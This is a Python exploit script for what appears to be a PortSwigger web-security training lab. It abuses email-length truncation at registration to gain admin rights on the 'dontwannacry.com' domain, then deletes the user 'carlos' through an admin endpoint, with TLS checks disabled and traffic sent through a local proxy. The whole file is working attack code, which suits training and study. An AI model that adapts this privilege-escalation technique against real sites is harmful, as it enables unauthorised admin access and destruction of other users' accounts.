import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def get_csrf_token(session, url) :
    
    res = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf = soup.find('input', {'name':'csrf'})['value']
    
    return csrf

def business_logic_exploit(session, url) :
    i = 236
    ok = False
    while not ok :
        # The registering the user
        register_url = url + '/register'
        csrf_token = get_csrf_token(session, register_url)
        data = {
            'csrf':csrf_token,
            'username':'test'+str(1),
            'email':'A'*i+'@dontwannacry.com.exploit-0a57007103cb14c0835c0ecc01180090.exploit-server.net',
            'password':'test'
        }
        
        r = session.post(register_url, data=data, verify=False, proxies=proxies)
        
        if "Please check your emails for your account registration link" in r.text :
            
            response = session.get(url, verify=False, proxies=proxies)
            # Use regex to find the href content of the <a> tag with id 'exploit-link'
            pattern = r"<a\s+id='exploit-link'\s+[^>]*\s+href='([^']+)'>"
            server = r"<a\s+id='exploit-link'\s+[^>]*\s+href='([^']+)/email'>"
            matches = re.search(pattern, response.text)
            server_urls = re.search(server, response.text)
        
            if matches :
                href_content = matches.group(1)
                server_url = server_urls.group(1)
                headers = {'Referer':url}
                res = session.get(href_content, headers=headers, verify=False, proxies=proxies)
                
                # Use regex to find the link inside the <a> tag
                pattern = r'<a href=\'(https?://[^<>\'\s]+)\'[^>]*>'
                matches = re.search(pattern, res.text)

                if matches :
                    link = matches.group(1)
                    # Confirm the user registration
                    headers = {'Referer':server_url}
                    response = session.get(link, headers=headers, verify=False, proxies=proxies)
                    
                    if "Account registration successful!" in res.text :
                        login_url = url + '/login'
                        csrf_token = get_csrf_token(session, login_url)
                        data = {
                            'csrf':csrf_token,
                            'username':'test'+str(1),
                            'password':'test'
                        }
                        session.post(login_url, data=data, verify=False, proxies=proxies)
                        
                        delete_url = url + '/admin/delete?username=carlos'
                        res = session.get(delete_url, verify=False, proxies=proxies)
                        
                        if 'Congratulations' in res.text :
                            print("You have successfully solved the lab")
                            ok = True
                        else :
                            print('Failed to exploit the business logic vulnerability')                
                    else:
                        print("Link not found.")
            else:
                print("Href content not found.")

            i += 1

if __name__ == "__main__" :
    try :
        url = sys.argv[1]
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    business_logic_exploit(session, url)